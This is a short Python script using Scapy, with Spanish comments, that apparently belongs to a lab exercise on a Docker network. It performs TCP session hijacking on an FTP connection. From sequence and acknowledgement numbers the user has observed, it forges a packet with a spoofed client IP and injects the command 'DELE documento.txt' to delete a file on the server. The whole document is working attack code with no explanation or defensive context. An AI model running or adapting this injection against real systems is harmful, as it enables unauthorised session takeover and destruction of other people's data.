from scapy.all import *

INTERFAZ = "docker0"

ip_cliente = "172.17.0.3"
ip_servidor = "172.17.0.2"
window = 501

# Solicitar datos del último paquete observado
puerto_cliente = int(input("Puerto de origen del cliente (no 21): ").strip())
seq_srv = int(input("SEQ del último paquete del servidor: ").strip())
ack_srv = int(input("ACK del último paquete del servidor: ").strip())
len_srv = int(input("Payload LEN del servidor (0 si solo ACK): ").strip())

# Calcular SEQ y ACK válidos para el cliente
seq_cli = seq_srv + len_srv
ack_cli = ack_srv

print(f"-> SEQ del cliente (usado en paquete): {seq_cli}")
print(f"-> ACK del cliente (para reconocer lo que envió el servidor): {ack_cli}")

# Construir el comando FTP
payload = b"DELE documento.txt\r\n"

# Crear y enviar el paquete
pkt = IP(src=ip_cliente, dst=ip_servidor) / \
      TCP(sport=puerto_cliente,
          dport=21,
          seq=seq_cli,
          ack=ack_cli,
          flags="PA",
          window=window) / \
      Raw(payload)

# Recalcular checksum
del pkt[IP].chksum
del pkt[TCP].chksum

send(pkt, iface=INTERFAZ)
print(f"\n[+] Paquete DELE enviado con éxito:\n{pkt.summary()}")

